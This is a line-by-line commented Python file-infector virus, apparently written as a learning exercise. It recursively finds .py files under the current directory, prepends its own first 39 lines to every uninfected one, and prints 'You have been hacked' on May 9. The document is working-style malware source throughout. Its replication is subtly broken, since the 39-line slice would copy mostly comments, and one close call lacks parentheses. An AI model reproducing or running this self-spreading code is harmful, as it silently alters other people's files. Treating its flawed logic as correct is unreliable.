# this line will import the operating system making it so the script can actually interact with the target destination
import os
# This will provide classes that work with date and time, This allows the script to manipulate Dates, times, and time intervals
import datetime
# This will create a new vairable called "SIGNATURE" and it sets the value to a string called "VIRUS"
SIGNATURE = "VIRUS"
# This line will create a function called "locate" and it will take a single argument called "path". 
# This style of function is used to recursively search for files in a specified directory and subdirectories, then it is going to add the file paths to a list.
# The list is then returned by the function
def locate(path):
    # This will initialize an empty list called "files_target" the function above will use this list to hold all the file paths of the files it recursively searches
    files_targeted = []
    # here the script is creating a variable called "filelist" and it will store the list of filenames
    filelist = os.listdir(path)
    # This will create a for loop that iterates through each filename('fname') in the filelist created above
    for fname in filelist:
        # "if os.path.isdir(path+"/"+fname):" will check if the current file or directory(fname) name is a directory or not
        # "os.path.isdir()" is a built in function that returns 'True' if the file or directory is a directory, it will return 'False' if not.
        # 'path+"/"fname' will create a new path that will consist of the directory path(path) and the file name(fname) if it is a new directory
        # then the next line of code will run, if not then the code will jump to the 'elif' line
        if os.path.isdir(path+"/"+fname):
            # if the fname is a directory then it will call the locate function on that directory
            files_targeted.extend(locate(path+"/"+fname))
        # this line takes over if the location is not a directory, it will check it if is a python file 
        elif fname[-3:] == ".py":
            # It will create a boolan vairable (to be used later) and set it to 'False'
            infected = False
            # creates a for loop to iterate over each line in the opened file. 
            for line in open(path+"/"+fname):
                # The if statement will check if for the srting variable "SIGNATURE" is present if so it skips the next line and leaves at the break
                if SIGNATURE in line:
                    # If the "SIGNATURE" is present it will set the variable 'infected' to true then exits at the break
                    infected = True
                    # it breaks out of the inner for loop and releases control to the outer for loop once it has found or planted the "SIGNATURE"
                    break
            # This checks if the 'infected' boolean is false, if so it goes to the next line.
            if infected == False:
                # This will add the files that are not infected to the list of tagets to be infected.
                files_targeted.append(path+"/"+fname)
    # then this will return the list of targets to infect
    return files_targeted
# This will start a new functions labeled 'infect' to iterate through the list "files_targeted"
def infect(files_targeted):
    # this line opens the actual virus file "(__file__)"
    virus = open(os.path.abspath(__file__))
    # then adds the contents of the virus file into a string variable named "virusstring"
    virusstring = ""
    # This will start a for loop to eterate through the 'virus' file 
    for i,line in enumerate(virus):
        # this will read the first 39 lines of the script file contained in the 'virus' variable
        if 0 <= i < 39:
            # then if the count value 'i' is between 0 & 39 it will append the 'virusstrung' variable 
            virusstring += line
    # then it will close the virus file
    virus.close 
    # progress to a new for loop to iterate over the filespaths being held in the 'files_targeted' varable 
    for fname in files_targeted:
        # uses the 'open' function to open the fname information into a 'f' variable
        f = open(fname)
        # then it reads the file using the 'read' function and assigns the contents to the 'temp' variable
        temp = f.read()
        # closes the 'f' file with the 'close function
        f.close()
        # re-opens it with the write permissions
        f = open(fname,"w")
        # then it writes the 'virusstring' data to the temp data
        f.write(virusstring + temp)
        # and closes the file again
        f.close()
# at this stage they are creating a new function labeled 'detonate' which is a condtitional statement
def detonate():
    # once the current date and time match (month 5: May, day 9: 9th)it will do the next line
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        # which prints the phrase "You have been hacked" it's nice of them to let you know.
        print("You have been hacked")
# this starts by calling the locate function (which is the first one defined) and passes that function through the current directory
# this 'locate' function will recursively serch for files with a python extension (.py) then it will return a list of thos paths.
files_targeted = locate(os.path.abspath(""))
# once this list is populated with file paths to the targeted files. The list is then passed to the infect function
# the 'infect' function will open each file and adds the contents of the 'virus' to them, this is the infection.
infect(files_targeted)
# once all the files are infected the 'detonate' function is called which then will check the date and time.
# if the date matches May 9th the message "You have been hacked" is printed
detonate()
# This script searches for Python files in the curreent and sub-directorys, then it infects them by attacting its own code to them
# which prints a message on a specific date.